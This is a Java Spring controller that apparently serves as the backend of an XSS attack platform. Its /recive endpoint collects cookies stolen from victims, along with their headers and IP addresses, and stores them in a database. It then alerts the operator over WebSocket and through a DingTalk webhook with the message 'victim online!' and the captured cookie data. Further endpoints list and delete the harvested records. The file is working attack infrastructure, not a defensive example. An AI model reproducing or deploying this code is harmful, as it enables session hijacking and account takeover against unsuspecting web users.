package com.madao.xss.controller;


import com.alibaba.fastjson.JSONObject;
import com.madao.xss.function.DingDing;
import com.madao.xss.mapper.DingConfigDao;
import com.madao.xss.mapper.ReciverDao;
import com.madao.xss.pojo.DingConfig;
import com.madao.xss.pojo.DingMsg;
import com.madao.xss.pojo.Reciver;
import com.madao.xss.service.WebSocketServer;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;

@Slf4j
@RestController
@RequestMapping("/")
@CrossOrigin
public class ReciverController {


    @Autowired
    private ReciverDao reciverDao;

    @Autowired
    private DingConfigDao dingConfigDao;

    @Autowired
    private DingDing dingDing;

    @Autowired
    private DingMsg ding;


    @GetMapping("/api/all")
    public List<Reciver> getAllRecivers() {
        return reciverDao.getRecivers();
    }


    @GetMapping("/api/del")
    public int delReciver(@RequestParam("time") String time) {
        return reciverDao.delReciver(time);
    }


    @GetMapping("/recive")
    public Map<String,String> getHeaders(HttpServletRequest request, @RequestHeader Map<String,String> headers, @RequestParam("cookie") String cookie) {

        //固定header
        String[] headerString = new String[] {"host","connection","user-agent","accept","accept-encoding","cookie"};
        List<String> headerList = Arrays.asList(headerString);

        //匹配到请求中的
        Map<String,String> headerMap = new HashMap<String, String>();
        headers.forEach( (key,value)-> {
            if(headerList.contains(key))
                headerMap.put(key,value);
        });



//        时间
        Date date=new Date();
        SimpleDateFormat temp=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  //这是24时
        String dateString=temp.format(date);
        headerMap.put("time",dateString);

//        data
        if(cookie != null)
            headerMap.put("data",cookie);

//        ip
        String ip = request.getRemoteAddr();
        headerMap.put("ip",ip);


        String headJson = JSONObject.toJSONString(headerMap);
        Reciver reciver = JSONObject.parseObject(headJson, Reciver.class);


        try {
            WebSocketServer.sendMessage("IP地址: "+ip);
        } catch (IOException e){
            log.info("消息推送失败");
        }


        //获取钉钉配置信息
        DingConfig dingConfig = dingConfigDao.getConfig();
        String webhook = dingConfig.getWebhook();
        if(dingConfig.isIsnotice() && webhook!=null){

            String content;
            //是否开启精简版消息
            if(dingConfig.getMsgconfig() == 0)
                content = "受害者上线!\n\nip:"+ip + "\n\ndata:" + cookie;
            else
                content = reciver.toString();
            //        钉钉消息
            Map<String,String> map = new HashMap<String, String>();
            map.put("content",content);
            ding.setMsgtype("text");
            ding.setText(map);
            dingDing.dingPost(JSONObject.toJSONString(ding),webhook);
        }



        //存数据库
        reciverDao.insertSelective(reciver);

        return headerMap;
    }
}
